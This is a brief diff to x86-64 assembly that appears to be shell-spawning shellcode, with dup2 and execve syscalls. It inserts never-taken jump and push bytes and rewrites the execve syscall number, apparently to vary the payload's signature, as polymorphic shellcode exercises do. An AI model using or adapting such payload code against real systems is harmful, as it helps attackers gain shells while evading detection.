@@ -58,6 +58,8 @@ _start:
 	xor rax, rax
 	mov al, 33
         xor rsi, rsi
+	db  0x72,0xcb
+	db  0x50
         syscall
 
 	xor rax, rax
@@ -91,7 +93,6 @@ _start:
 	push rdi
 	mov rsi, rsp	
 	xor rdx, rdx
-        add rax, 60
-	dec rax
+        add rax, 59
         syscall
  
